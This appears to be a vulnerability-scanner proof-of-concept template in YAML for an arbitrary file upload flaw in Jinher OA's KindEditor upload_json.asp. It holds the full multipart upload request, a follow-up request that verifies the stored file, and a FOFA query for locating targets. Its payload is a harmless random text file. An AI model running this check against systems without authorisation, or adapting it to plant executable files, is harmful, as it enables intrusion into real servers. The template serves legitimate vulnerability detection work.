id: poc-yaml-jinher-oa-upload-json-asp-anyfile-upload
info:
  name: 金和OA upload_json.asp 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_str(8)
  t2: random_str(4)
  t3: base64(t2)
  dt_1: datetime("2006")
  dt_2: datetime("01")
  dt_3: datetime("02")
requests:
- method: POST
  path: /c6/KindEditor1/asp/upload_json.asp?dir=file
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------{{.t1}}
  data: '-----------------------------{{.t1}}

    Content-Disposition: form-data; name="localUrl"



    -----------------------------{{.t1}}

    Content-Disposition: form-data; name="imgFile"; filename="{{.t2}}.txt"

    Content-Type: image/png


    {{.t3}}

    -----------------------------{{.t1}}-- '
  expression: status_code == 200 && contains(body,"\"url\":")
  output:
  - regex_match(body,`(?P<file>[0-9]{9,32}).txt`)
- method: GET
  path: /c6/KindEditor1/asp/../attached/file/{{.dt_1}}{{.dt_2}}{{.dt_3}}/{{.file}}.txt
  expression: status_code == 200 && body == t3
transport: http
